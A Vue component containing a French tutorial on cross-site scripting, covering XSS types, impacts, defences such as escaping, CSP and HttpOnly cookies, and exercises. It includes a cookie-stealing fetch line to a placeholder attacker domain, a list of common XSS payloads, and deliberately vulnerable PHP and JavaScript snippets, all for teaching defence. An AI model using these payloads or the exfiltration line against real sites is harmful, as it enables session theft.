<template>
    <div class="lesson-container">
        <div class="lesson-content">

            <!-- En-tête de la leçon -->
            <header class="lesson-header">
                <h1 class="text-white">Sécurité : Comprendre et prévenir les failles XSS</h1>
                <p class="lesson-meta text-white">Sécurité Web • JavaScript • XSS • CSP • OWASP</p>
            </header>

            <!-- Introduction -->
            <section class="lesson-section bg-light-purple border-purple">
                <h2 class="text-purple">Qu'est-ce qu'une faille XSS ?</h2>
                <p class="textExemple">
                    <strong>XSS (Cross-Site Scripting)</strong> est une vulnérabilité de sécurité web qui permet à un attaquant
                    d'injecter des scripts malveillants dans des pages web consultées par d'autres utilisateurs.
                    Ces scripts s'exécutent dans le navigateur de la victime, avec les mêmes privilèges que le site légitime.
                </p>
                <p class="textExemple">
                    Les conséquences peuvent être graves : vol de cookies (et donc de sessions), keylogging, redirection vers des sites malveillants,
                    dégradation de l'interface, ou encore exécution d'actions à l'insu de l'utilisateur (CSRF).
                </p>
                <div class="warning-section">
                    <h4 class="text-purple">⚠️ Statistique OWASP</h4>
                    <p>Les XSS figurent parmi les <strong>top 10 des vulnérabilités web</strong> les plus critiques et les plus répandues.</p>
                </div>
            </section>

            <!-- Types de XSS -->
            <section class="lesson-section bg-light-purple border-purple">
                <h2 class="text-purple">Les trois types de XSS</h2>

                <div class="textExemple">
                    <h3 class="text-purple">1. XSS Réfléchi (Reflected)</h3>
                    <p>
                        Le script malveillant est inclus dans une URL ou un formulaire et est renvoyé immédiatement par le serveur
                        dans la réponse HTTP. L'attaquant doit amener la victime à cliquer sur un lien piégé.
                    </p>
                    <div class="code-example">
                        <pre v-pre><code class="language-html">URL malveillante : https://example.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;

La page affiche : "Résultats pour : &lt;script&gt;alert('XSS')&lt;/script&gt;"</code></pre>
                    </div>
                </div>

                <div class="textExemple">
                    <h3 class="text-purple">2. XSS Stocké (Stored / Persistent)</h3>
                    <p>
                        Le script est stocké durablement sur le serveur (base de données, fichiers, etc.) et est affiché
                        à chaque consultation de la page vulnérable. C'est le plus dangereux car il touche tous les visiteurs.
                    </p>
                    <div class="code-example">
                        <pre v-pre><code class="language-plaintext">Exemple : Un commentaire de blog contenant &lt;script&gt;...&lt;/script&gt;.
Tous les utilisateurs qui lisent le commentaire exécutent le script.</code></pre>
                    </div>
                </div>

                <div class="textExemple">
                    <h3 class="text-purple">3. XSS Basé sur le DOM (DOM‑based)</h3>
                    <p>
                        La vulnérabilité se trouve dans le code JavaScript côté client, qui manipule le DOM de façon dangereuse
                        sans passer par le serveur. Exemple : <code>document.write(location.hash)</code>.
                    </p>
                    <div class="code-example">
                        <pre v-pre><code class="language-javascript">// URL : https://site.com/#&lt;img src=x onerror=alert(1)&gt;
const userInput = location.hash.substring(1);
document.getElementById('content').innerHTML = userInput;</code></pre>
                    </div>
                </div>
            </section>

            <!-- Conséquences et risques -->
            <section class="lesson-section bg-light-purple border-purple">
                <h2 class="text-purple">Risques et impacts d'une faille XSS</h2>

                <div class="textExemple">
                    <ul>
                        <li><strong>Vol de session (cookie stealing)</strong> : l'attaquant peut récupérer les cookies de session et usurper l'identité de la victime.</li>
                        <li><strong>Keylogging</strong> : enregistrement des frappes au clavier pour capturer mots de passe, coordonnées bancaires.</li>
                        <li><strong>Phishing amélioré</strong> : injection de faux formulaires de connexion directement dans la page légitime.</li>
                        <li><strong>Exfiltration de données</strong> : envoi de données sensibles (contenu du DOM, localStorage) vers un serveur tiers.</li>
                        <li><strong>Défacing</strong> : altération de l'apparence du site pour nuire à la réputation.</li>
                        <li><strong>Propagation de malware</strong> : redirection vers des sites infectés ou téléchargement forcé.</li>
                        <li><strong>Actions à l'insu de l'utilisateur</strong> : exécution de requêtes HTTP (achat, modification de mot de passe) via CSRF combiné.</li>
                    </ul>
                </div>

                <div class="warning-section">
                    <h4 class="text-purple">Exemple concret : vol de cookie</h4>
                    <div class="code-example">
                        <pre v-pre><code class="language-javascript">// Script injecté
fetch('https://attaquant.com/steal?cookie=' + document.cookie);</code></pre>
                    </div>
                    <p>L'attaquant reçoit le cookie de session et peut l'utiliser pour se connecter à la place de la victime.</p>
                </div>
            </section>

            <!-- Comment se protéger ? -->
            <section class="lesson-section bg-light-purple border-purple">
                <h2 class="text-purple">Bonnes pratiques de protection</h2>

                <div class="textExemple">
                    <h3 class="text-purple">1. Échapper les sorties (Output Encoding)</h3>
                    <p>
                        La règle d'or : <strong>ne jamais faire confiance aux données utilisateur</strong>. Avant d'afficher une donnée,
                        l'encoder en fonction du contexte (HTML, attribut, JavaScript, CSS, URL).
                    </p>
                    <div class="code-example">
                        <pre v-pre><code class="language-php">// PHP : échappement HTML
echo htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8');

// Twig (Symfony) : échappement automatique par défaut
{{ userInput }}  // équivalent à {{ userInput|escape('html') }}

// JavaScript (côté navigateur)
const safeText = document.createTextNode(userInput);
element.appendChild(safeText); // Pas d'interprétation HTML</code></pre>
                    </div>
                </div>

                <div class="textExemple">
                    <h3 class="text-purple">2. Validation et assainissement des entrées</h3>
                    <p>Rejeter les entrées qui ne correspondent pas à un format attendu (whitelist). Pour le HTML riche, utiliser une bibliothèque comme HTMLPurifier.</p>
                    <div class="code-example">
                        <pre v-pre><code class="language-php">// Validation stricte
if (!preg_match('/^[a-zA-Z0-9]+$/', $username)) {
    throw new Exception('Nom d’utilisateur invalide');
}</code></pre>
                    </div>
                </div>

                <div class="textExemple">
                    <h3 class="text-purple">3. Content Security Policy (CSP)</h3>
                    <p>
                        CSP est un en-tête HTTP qui restreint les sources de scripts, styles, images, etc.
                        Même en cas de faille XSS, le navigateur bloquera l'exécution du script non autorisé.
                    </p>
                    <div class="code-example">
                        <pre v-pre><code class="language-http">Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com</code></pre>
                    </div>
                </div>

                <div class="textExemple">
                    <h3 class="text-purple">4. Cookies sécurisés</h3>
                    <div class="code-example">
                        <pre v-pre><code class="language-plaintext">Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict</code></pre>
                    </div>
                    <ul>
                        <li><strong>HttpOnly</strong> : empêche l'accès au cookie via JavaScript (document.cookie).</li>
                        <li><strong>Secure</strong> : le cookie n'est envoyé qu'en HTTPS.</li>
                        <li><strong>SameSite</strong> : limite l'envoi du cookie en contexte intersite.</li>
                    </ul>
                </div>

                <div class="textExemple">
                    <h3 class="text-purple">5. Éviter les fonctions dangereuses en JavaScript</h3>
                    <div class="code-example">
                        <pre v-pre><code class="language-javascript">// ❌ Dangereuses
eval(userInput);
setTimeout(userInput, 0);
document.write(userInput);
element.innerHTML = userInput;

// ✅ Préférer
element.textContent = userInput;
element.setAttribute('data-value', userInput);</code></pre>
                    </div>
                </div>
            </section>

            <!-- XSS dans différents contextes -->
            <section class="lesson-section bg-light-purple border-purple">
                <h2 class="text-purple">Spécificités par contexte</h2>

                <div class="textExemple">
                    <h3 class="text-purple">Contexte HTML</h3>
                    <div class="code-example">
                        <pre v-pre><code class="language-html">&lt;div&gt;{{ userInput }}&lt;/div&gt;
// Échappement : &lt; → &amp;lt; , &gt; → &amp;gt;</code></pre>
                    </div>
                </div>

                <div class="textExemple">
                    <h3 class="text-purple">Contexte attribut HTML</h3>
                    <div class="code-example">
                        <pre v-pre><code class="language-html">&lt;input value="{{ userInput }}"&gt;
// Échappement : " → &amp;quot;</code></pre>
                    </div>
                </div>

                <div class="textExemple">
                    <h3 class="text-purple">Contexte JavaScript (dans une chaîne)</h3>
                    <div class="code-example">
                        <pre v-pre><code class="language-javascript">&lt;script&gt;
    var message = "{{ userInput }}";
&lt;/script&gt;
// Échappement : " → \", \ → \\, etc.</code></pre>
                    </div>
                </div>

                <div class="textExemple">
                    <h3 class="text-purple">Contexte URL (paramètre)</h3>
                    <div class="code-example">
                        <pre v-pre><code class="language-html">&lt;a href="/page?param={{ userInput }}"&gt;lien&lt;/a&gt;
// Échappement : URL-encoding ( %3C, %3E )</code></pre>
                    </div>
                </div>
            </section>

            <!-- Outils de détection -->
            <section class="lesson-section bg-light-purple border-purple">
                <h2 class="text-purple">Outils pour détecter les XSS</h2>

                <div class="textExemple">
                    <ul>
                        <li><strong>Navigateur</strong> : console développeur, onglet Sécurité.</li>
                        <li><strong>Extensions</strong> : OWASP ZAP, Burp Suite (proxy d'audit).</li>
                        <li><strong>Linters</strong> : ESLint avec plugin security.</li>
                        <li><strong>Tests automatisés</strong> : frameworks comme Cypress, Selenium avec payloads XSS.</li>
                        <li><strong>Headless browsers</strong> : Puppeteer, Playwright pour détecter l'exécution de scripts.</li>
                    </ul>
                </div>
            </section>

            <!-- Exemples de payloads XSS -->
            <section class="lesson-section bg-light-purple border-purple">
                <h2 class="text-purple">Payloads XSS courants (à des fins éducatives)</h2>

                <div class="warning-section">
                    <h4 class="text-purple">⚠️ Ne testez que sur vos propres applications ou des environnements autorisés.</h4>
                </div>

                <div class="code-example">
                    <pre v-pre><code class="language-html">&lt;script&gt;alert('XSS')&lt;/script&gt;
&lt;img src=x onerror=alert(1)&gt;
&lt;svg onload=alert(1)&gt;
&lt;body onload=alert(1)&gt;
&lt;input onfocus=alert(1) autofocus&gt;
&lt;a href="javascript:alert(1)"&gt;clic&lt;/a&gt;
&lt;iframe src="javascript:alert(1)"&gt;
&lt;div onmouseover="alert(1)"&gt;survolez&lt;/div&gt;</code></pre>
                </div>
            </section>

            <!-- Exercices pratiques -->
            <section class="lesson-section bg-light-purple border-purple">
                <h2 class="text-purple">Exercices pratiques</h2>

                <div class="exercise">
                    <h3 class="text-purple">Exercice 1 : Identifier une faille XSS</h3>
                    <p>Le code PHP suivant affiche le paramètre "name" sans échappement. Expliquez le danger et corrigez-le.</p>
                    <div class="code-example">
                        <pre v-pre><code class="language-php">&lt;?php
$name = $_GET['name'];
echo "&lt;h1&gt;Bonjour $name&lt;/h1&gt;";
?&gt;</code></pre>
                    </div>
                    <details class="solution">
                        <summary class="btn-purple btn-hover">Voir la solution</summary>
                        <div class="solution-content">
                            <pre v-pre><code class="language-php">// Correction : échappement HTML
$name = htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
echo "&lt;h1&gt;Bonjour $name&lt;/h1&gt;";</code></pre>
                        </div>
                    </details>
                </div>

                <div class="exercise">
                    <h3 class="text-purple">Exercice 2 : Mettre en place une CSP</h3>
                    <p>Ajoutez un en-tête CSP qui autorise uniquement les scripts provenant du même domaine (self) et les styles inline uniquement via nonce.</p>
                    <details class="solution">
                        <summary class="btn-purple btn-hover">Voir la solution</summary>
                        <div class="solution-content">
                            <pre v-pre><code class="language-http">Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';</code></pre>
                            <p>Ou mieux avec un nonce :</p>
                            <pre v-pre><code class="language-http">Content-Security-Policy: script-src 'nonce-{RANDOM}';</code></pre>
                        </div>
                    </details>
                </div>

                <div class="exercise">
                    <h3 class="text-purple">Exercice 3 : Réflexion – DOM XSS</h3>
                    <p>Corrigez ce code JS pour éviter une injection DOM XSS :</p>
                    <div class="code-example">
                        <pre v-pre><code class="language-javascript">const user = location.hash.slice(1);
document.getElementById('welcome').innerHTML = "Bienvenue " + user;</code></pre>
                    </div>
                    <details class="solution">
                        <summary class="btn-purple btn-hover">Voir la solution</summary>
                        <div class="solution-content">
                            <pre v-pre><code class="language-javascript">const user = location.hash.slice(1);
const el = document.getElementById('welcome');
el.textContent = "Bienvenue " + user;  // Pas d'HTML, pas d'injection</code></pre>
                        </div>
                    </details>
                </div>
            </section>

            <!-- Conclusion -->
            <section class="lesson-section bg-light-purple border-purple">
                <h2 class="text-purple">Conclusion</h2>

                <div class="textExemple">
                    <p>
                        Les failles XSS sont un danger majeur pour toute application web. Leur prévention repose sur
                        des principes simples mais impératifs : <strong>ne jamais faire confiance aux données utilisateur</strong>,
                        échapper systématiquement les sorties, utiliser CSP et les bons en-têtes de sécurité.
                    </p>
                    <p>
                        En suivant ces bonnes pratiques, vous protégez vos utilisateurs contre le vol de sessions,
                        le phishing et bien d'autres attaques. La sécurité est un processus continu : testez,
                        auditez et restez informé des nouvelles menaces.
                    </p>
                    <p>
                        Pour aller plus loin : OWASP Top 10, audits de sécurité, formation à la sécurité applicative (SSI).
                    </p>
                </div>
            </section>

        </div>
    </div>
</template>

<script>
export default {
    name: 'XssLesson',

    mounted() {
        const loadHighlightJS = () => {
            return new Promise((resolve) => {
                if (window.hljs) { resolve(); return; }

                const link = document.createElement('link');
                link.rel  = 'stylesheet';
                link.href = 'https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/vs2015.min.css';
                document.head.appendChild(link);

                const script = document.createElement('script');
                script.src = 'https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js';
                script.onload = () => {
                    const phpScript = document.createElement('script');
                    phpScript.src = 'https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/php.min.js';
                    phpScript.onload = () => {
                        const jsScript = document.createElement('script');
                        jsScript.src = 'https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/javascript.min.js';
                        jsScript.onload = () => {
                            const htmlScript = document.createElement('script');
                            htmlScript.src = 'https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/xml.min.js';
                            htmlScript.onload = resolve;
                            document.head.appendChild(htmlScript);
                        };
                        document.head.appendChild(jsScript);
                    };
                    document.head.appendChild(phpScript);
                };
                document.head.appendChild(script);
            });
        };

        loadHighlightJS().then(() => {
            this.$el.querySelectorAll('pre code').forEach((block) => {
                window.hljs.highlightElement(block);
            });
        });
    }
}
</script>

<style scoped>
.lesson-container {
    padding: 2rem;
    background: #f8f9fa;
    min-height: 100vh;
}

.lesson-content {
    max-width: 1200px;
    margin: 0 auto;
    width: 100%;
    overflow-x: hidden;
}

.lesson-header {
    background: linear-gradient(135deg, #8B5FBF 0%, #6A3093 100%);
    padding: 3rem 2rem;
    border-radius: 15px;
    margin-bottom: 2rem;
    text-align: center;
    position: relative;
    overflow: hidden;
}

.lesson-header::before {
    content: '';
    position: absolute;
    top: 0; left: 0; right: 0; bottom: 0;
    background: url("data:image/svg+xml,%3Csvg width='100' height='100' viewBox='0 0 100 100' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M11 18c3.866 0 7-3.134 7-7s-3.134-7-7-7-7 3.134-7 7 3.134 7 7 7zm48 25c3.866 0 7-3.134 7-7s-3.134-7-7-7-7 3.134-7 7 3.134 7 7 7zm-43-7c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zm63 31c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zM34 90c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zm56-76c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zM12 86c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4zm28-65c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4zm23-11c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm-6 60c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4zm29 22c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zM32 63c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm57-13c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm-9-21c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2zM60 91c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2zM35 41c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2zM12 60c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2z' fill='%23ffffff' fill-opacity='0.03' fill-rule='evenodd'/%3E%3C/svg%3E");
}

.lesson-header h1 {
    font-size: 2.5rem;
    margin-bottom: 1rem;
    position: relative;
}

.lesson-meta {
    font-size: 1.1rem;
    opacity: 0.9;
    position: relative;
}

.lesson-section {
    padding: 2rem;
    margin-bottom: 2rem;
    border-radius: 15px;
    transition: all 0.3s ease;
    width: 100%;
    overflow-x: hidden;
    box-sizing: border-box;
    animation: fadeInUp 0.6s ease forwards;
}

.lesson-section:hover {
    transform: translateY(-5px);
    box-shadow: 0 12px 35px rgba(106, 48, 147, 0.15);
}

.bg-light-purple { background-color: #f8f6ff; }

.border-purple {
    border: 2px solid #e0d6ff;
    transition: all 0.3s ease;
}

.text-purple { color: #6A3093 !important; }
.text-white  { color: white !important; }

.btn-purple {
    background: linear-gradient(135deg, #8B5FBF 0%, #6A3093 100%);
    border: none;
    color: white;
    font-weight: 600;
    padding: 12px 24px;
    border-radius: 8px;
    transition: all 0.3s ease;
    box-shadow: 0 4px 15px rgba(106, 48, 147, 0.2);
    text-decoration: none;
    display: inline-block;
    cursor: pointer;
    margin: 0.5rem 0;
}

.btn-purple:hover {
    background: linear-gradient(135deg, #7a4fa8 0%, #5a287a 100%);
    transform: translateY(-2px);
    box-shadow: 0 6px 20px rgba(106, 48, 147, 0.3);
    color: white;
}

.warning-section {
    background: #fff3f3;
    border: 2px solid #ff6b6b;
    border-radius: 10px;
    padding: 1.5rem;
    margin: 1.5rem 0;
}

.code-example {
    margin: 1.5rem 0;
    width: 100%;
    box-sizing: border-box;
}

pre {
    background: #1e1e1e !important;
    color: #d4d4d4 !important;
    padding: 1.5rem !important;
    border-radius: 8px;
    overflow-x: auto;
    border: 1px solid #333;
    font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
    font-size: 0.9rem;
    line-height: 1.5;
    width: 100%;
    box-sizing: border-box;
    white-space: pre;
    margin: 0;
}

pre code {
    display: block;
    white-space: pre;
    width: 100%;
}

.exercise { margin: 2rem 0; }
.solution { margin: 1rem 0; }

.solution-content {
    margin-top: 1rem;
    padding: 1rem;
    background: #f8f9fa;
    border-radius: 8px;
    border-left: 4px solid #8B5FBF;
}

.textExemple {
    margin-bottom: 1rem;
    line-height: 1.6;
}

@media (max-width: 768px) {
    .lesson-container  { padding: 1rem; }
    .lesson-header     { padding: 2rem 1rem; }
    .lesson-header h1  { font-size: 2rem; }
    .lesson-section    { padding: 1.5rem; }
    pre                { padding: 1rem !important; font-size: 0.85rem; }
}

@media (max-width: 480px) {
    pre               { padding: 0.75rem !important; font-size: 0.8rem; }
    .lesson-container { padding: 0.5rem; }
    .lesson-section   { padding: 1rem; }
    .lesson-header    { padding: 1.5rem 1rem; }
    .lesson-header h1 { font-size: 1.75rem; }
}

@keyframes fadeInUp {
    from { opacity: 0; transform: translateY(30px); }
    to   { opacity: 1; transform: translateY(0); }
}
</style>